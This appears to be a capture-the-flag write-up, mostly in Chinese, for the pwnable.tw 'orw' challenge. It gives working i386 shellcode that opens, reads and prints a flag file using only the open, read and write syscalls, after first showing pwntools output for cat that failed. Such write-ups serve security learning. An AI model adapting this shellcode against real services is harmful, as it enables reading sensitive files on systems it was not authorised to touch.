# orw

> Challenge link: [orw](https://pwnable.tw/challenge/#2)
>
> Category: pwn
>
> Writeup: [orw](https://github.com/frozenkp/CTF/tree/master/others/pwnable.tw/orw)

Read the flag from `/home/orw/flag`.

Only `open` `read` `write` syscall are allowed to use.

`nc chall.pwnable.tw 10001`

[orw](https://pwnable.tw/static/chall/orw)

## Observation

這題題意很簡單，就是輸入 shellcode，它會幫你執行

題目敘述中有說只能使用 `open` `read` `write`，且 flag 在 `/home/orw/flag` ，所以步驟如下

- open('/home/orw/flag')
- read to buffer
- write to stdout

![](https://i.imgur.com/x1eEwmd.png)

## Try

我一開始試著使用 pwntool 中內建的[工具](http://docs.pwntools.com/en/stable/shellcraft/i386.html)，但無法成功讀出檔案

```python
>>> print shellcraft.i386.linux.cat('/home/orw/flag')
    /* push '/home/orw/flag\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    /* open(file='esp', oflag='O_RDONLY', mode=0) */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=2147483647) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x7fffffff
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80
```

## Solution

最後我選擇參考 [x86 syscall](https://syscalls.kernelgrok.com/) 逐步構造出 `open` `read` `write` 

- `open(file='esp', oflag='O_RDONLY', mode=0)`
  - 這個我採用 pwntool 輸出的寫法
- `read(fd, buf, length)`
  - `eax` 是 0x3
  - `fd` 存在 `open()` 的回傳結果 (`eax`)
  - `buf` 選在 `esp`
  - `length` 是 60
- `write(stdout, buf, length)`
  - `eax` 是 0x4
  - `stdout` 是 1
  - `buf` 是剛剛讀取的 `esp`
  - `length` 是 60

```assembly
/* push '/home/orw/flag\x00' */
        push 0x1010101
        xor dword ptr [esp], 0x1016660
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
/* open(file='esp', oflag='O_RDONLY', mode=0) */
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
/* call open() */
        push SYS_open /* 5 */
        pop eax
        int 0x80
/*call read()*/
        push eax
        push 0x3
        pop eax
        pop ebx
        push 60
        pop edx
        mov ecx, esp
        int 0x80
/*call write()*/
        push 0x4
        pop eax
        push 0x1
        pop ebx
        push 60
        pop edx
        mov ecx, esp
        int 0x80
```

